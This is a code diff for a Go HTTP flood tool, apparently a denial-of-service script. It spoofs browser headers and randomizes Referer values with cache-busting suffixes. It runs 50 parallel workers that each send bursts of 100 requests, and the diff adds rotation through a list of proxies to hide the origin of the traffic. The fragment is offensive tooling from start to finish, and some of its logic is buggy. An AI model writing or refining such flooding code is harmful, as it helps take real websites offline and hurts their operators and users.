@@ -87,37 +87,35 @@ func main() {
     req.Header.Set("Accept-Language", "en-US,en;q=0.9")
     req.Header.Set("Accept-Encoding", "gzip, deflate, br")
     req.Header.Set("sec-fetch-site", "cross-site")
-    req.Header.Set("Referer", referers[rand.Intn(len(referers))]+buildblock(rand.Intn(5)+5))
     req.Header.Set("Keep-Alive", string(rand.Intn(10)+100))
     req.Header.Set("Connection", "keep-alive")
 
     for i := 0; i < 50; i++ {
-        go func() { // Menggunakan goroutine untuk menjalankan setiap worker secara paralel
-            transport := &http.Transport{
-                Proxy: http.ProxyURL(proxyURL),
-                MaxIdleConns:        20,
-                MaxIdleConnsPerHost: 20,
-            }
-            client := &http.Client{
-                Timeout:   2000 * time.Millisecond,
-                Transport: transport,
-            }
-
+        go func() { // Using a goroutine to run each worker in parallel
             for referer := range refererChannel {
+                transport := &http.Transport{
+                    Proxy: http.ProxyURL(proxyURLs[rand.Intn(len(proxyURLs))]), // Use random proxy from the list
+                    MaxIdleConns:        20,
+                    MaxIdleConnsPerHost: 20,
+                }
+                client := &http.Client{
+                    Timeout:   2000 * time.Millisecond,
+                    Transport: transport,
+                }
+            
                 req.Header.Set("Referer", referer+buildblock(rand.Intn(5)+5))
 
-                // Jalankan 100 permintaan menggunakan satu proxy dan referer
+                // Make 100 requests using one proxy and referer
                 for j := 0; j < 100; j++ {
                     resp, err := client.Do(req)
                     if err != nil {
                         continue
                     }
                     defer resp.Body.Close()
-                    fmt.Println("Request successful with proxy", proxyURL.String(), "for referer", referer, "Request number", j)
+                    fmt.Println("Request successful with proxy", proxyURLs[rand.Intn(len(proxyURLs))].String(), "for referer", referer, "Request number", j)
                 }
             }
         }()
     }
-
+    
     time.Sleep(50 * time.Second)
-}
